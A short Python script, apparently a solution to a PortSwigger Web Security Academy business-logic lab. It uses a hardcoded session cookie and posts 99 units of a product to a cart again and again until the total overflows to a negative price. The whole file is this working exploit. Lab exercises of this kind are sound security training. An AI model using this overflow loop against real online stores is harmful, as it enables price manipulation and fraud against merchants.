import requests

url = 'https://acac1f841ee5ead3c03b01d700b2009f.web-security-academy.net/cart'

def addToCart():
    while True:
        response = requests.post(url, cookies={
            'session': '1GmZ8QZXeRY8B0KhsAGCITUsStCocPio'
        }, data={
            'productId': 1,
            'quantity': 99,
            'redir': 'CART'
        })

        if '-$' in response.text:
            print('Add until negative')
            break

addToCart()